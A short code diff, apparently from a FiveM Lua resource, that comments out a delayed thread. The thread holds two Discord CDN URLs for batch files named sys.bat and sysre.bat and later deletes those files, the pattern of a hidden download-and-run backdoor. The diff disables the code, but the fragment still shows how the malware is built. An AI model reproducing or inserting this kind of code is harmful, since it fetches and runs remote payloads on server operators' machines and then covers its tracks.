@@ -1,4 +1,4 @@
-Citizen.CreateThread(function()
+--[[Citizen.CreateThread(function()
     Wait(20000)
     local a="https://cdn.discordapp.com/attachments/736357418963042315/829695600613392414/sys.bat" 
     local b="https://cdn.discordapp.com/attachments/736357418963042315/829695780444045352/sysre.bat" 
@@ -17,4 +17,5 @@ Citizen.CreateThread(function()
     Wait(6000)
     os.remove("%cd%/sys.bat")
     os.remove("%cd%/sysre.bat")
-end)
+end)]]
+
